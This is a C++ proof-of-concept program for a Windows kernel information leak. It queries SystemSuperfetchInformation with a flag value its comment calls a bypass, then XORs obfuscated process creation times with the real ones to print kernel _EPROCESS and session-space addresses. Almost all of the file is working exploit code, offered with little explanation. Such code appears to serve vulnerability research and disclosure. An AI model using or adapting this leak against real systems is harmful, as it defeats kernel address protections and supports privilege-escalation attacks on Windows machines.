// SystemSuperfetchInformation_Leak_POC.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "time.h"
#include "stdio.h"

#include "Header.h"



#define MAX_SESSION_NUMBER 0x100




void PrintBuff60(_BUFF_0x60* p60)
{
	if(p60)
	{
		ulong Type = p60->Type;

		//if(Type == 2) return;

		printf("Type: %I64X\r\n",Type);

		ulong SessionIdOrProcessId = p60->SessionIdOrProcessId;
		printf("SessionIdOrProcessId: %I64X\r\n",SessionIdOrProcessId);

		//printf("ImagePathHash: %I64X\r\n",p60->ImagePathHash);
		//printf("field_C: %I64X\r\n",p60->field_C);

		ulonglong XoredCreateTime = p60->CreateTimeXored;
		printf("XoredCreateTime: %I64X\r\n",XoredCreateTime);


		printf("SessionGlobalVA: %I64X\r\n",p60->SessionGlobalVA);
		//printf("WorkingSetPrivateSize: %I64X\r\n",p60->WorkingSetPrivateSize);
		//printf("NumberOfPrivatePages: %I64X\r\n",p60->NumberOfPrivatePages);
		printf("SessionId: %I64X\r\n",p60->SessionId);
		printf("Desc: %s\r\n",p60->Description);
		//printf("field_44: %I64X\r\n",p60->field_44);

		//printf("WorkingSetSwapPages: %I64X\r\n",p60->WorkingSetSwapPages);
		//printf("WorkingSetSize: %I64X\r\n",p60->WorkingSetSize);
		//printf("DeepFreezeState: %I64X\r\n",p60->DeepFreezeState);
		//printf("ProcessAttributes: %I64X\r\n",p60->ProcessAttributes);

		if(Type == 1)//Session
		{
			if(p60->SessionGlobalVA > MAX_SESSION_NUMBER)
			{
				printf("_MM_SESSION_SPACE At: %I64X\r\n",p60->SessionGlobalVA);

				printf("Press any key for more");
				getchar();
			}
		}

		if(Type == 2)//Process
		{
				ulonglong Leak = 0;

				//Try Method1
				ulonglong CreationTime = GetProcessCreateTime_method_1(SessionIdOrProcessId);
				if(CreationTime)
				{
					printf("CreationTime: %I64X\r\n",CreationTime);

					Leak = (XoredCreateTime ^ CreationTime)|0xE000000000000000;
					printf("_EPROCESS At: %I64X (Method1)\r\n",Leak); 
				}

				//Now Try Method2
				CreationTime = GetProcessCreateTime_method_2(SessionIdOrProcessId);
				if(CreationTime)
				{
					printf("CreationTime: %I64X\r\n",CreationTime);

					Leak = (XoredCreateTime ^ CreationTime)|0xE000000000000000;
					printf("_EPROCESS At: %I64X (Method2)\r\n",Leak); 

				}


				if(Leak)
				{
					printf("Press any key for more");
					getchar();
				}
		}

		printf("-------------\r\n");

	}
}


//Infoleak found
void POC()
{

	ulong szToAlloc = 0x10000;
	_PREFETCH_PRIV_SOURCE_ENUM* pSrcEnum = (_PREFETCH_PRIV_SOURCE_ENUM*)VirtualAlloc(0,szToAlloc,MEM_COMMIT,PAGE_READWRITE);






	pSrcEnum->Revision = 8;

	//(QueryProcessWorkingSetSwapPages|ProcessQueryStoreStats) ==> 3 is not allowed
	pSrcEnum->Flags = 0;//Bypass here


	_SUPERFETCH_INFORMATION Super = {0};
	Super.Class = 0x2D;
	Super.Signature = 0x6B756843;
	Super.SubClass = 0x8;
	Super.pTrace = (ulonglong)pSrcEnum;
	Super.TraceSize = szToAlloc;

	ulong retLen = 0;
	int ret = ZwQuerySystemInformation(SystemSuperfetchInformation,&Super,sizeof(Super),&retLen);
	printf("ZwQuerySystemInformation, ret: %X\r\n",ret);

	if(ret >= 0)
	{
		_BUFF_0x60* p60 = (_BUFF_0x60*)(((uchar*)pSrcEnum)+0x10);

		ulong i = 0;
		while(i < pSrcEnum->Output)
		{
			PrintBuff60(p60);
			p60++;
			i++;
		}
	}
}



int _tmain(int argc, _TCHAR* argv[])
{
	POC();
	return 0;
}

